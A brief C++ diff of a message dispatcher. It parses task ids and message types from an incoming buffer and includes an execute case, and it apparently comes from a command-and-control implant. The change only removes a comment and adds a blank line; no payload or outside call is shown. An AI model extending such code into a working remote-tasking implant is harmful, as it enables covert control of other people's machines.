@@ -249,7 +249,7 @@ namespace Dispatcher {
         ULONG msg_type = 0;
 
         Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
-        Parser::UnpackDword(&parser); // throw-away peer id
+        Parser::UnpackDword(&parser);
 
         Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
         msg_type = Parser::UnpackDword(&parser);
@@ -281,6 +281,7 @@ namespace Dispatcher {
             }
 
             case TypeExecute: {
+
                 void *exec  = { };
                 size_t size = parser.Length;
 
